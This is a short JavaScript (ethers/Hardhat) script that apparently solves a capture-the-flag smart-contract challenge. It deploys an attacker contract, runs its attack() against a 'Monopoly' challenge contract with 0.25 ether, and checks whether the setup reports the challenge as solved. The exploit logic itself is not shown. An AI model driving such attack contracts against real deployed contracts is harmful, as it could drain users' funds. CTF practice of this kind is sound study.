const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("tneroAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x34e5EC7DA55039f332949a6d7dB506cD94594E12" );
  const ctf = await ethers.getContractAt( "Monopoly", "0x2488764643d43f974b3819dc14400543B3DF9904" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy();
  await exploit.attack(ctf.address, { value: parseEther("0.25") });

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
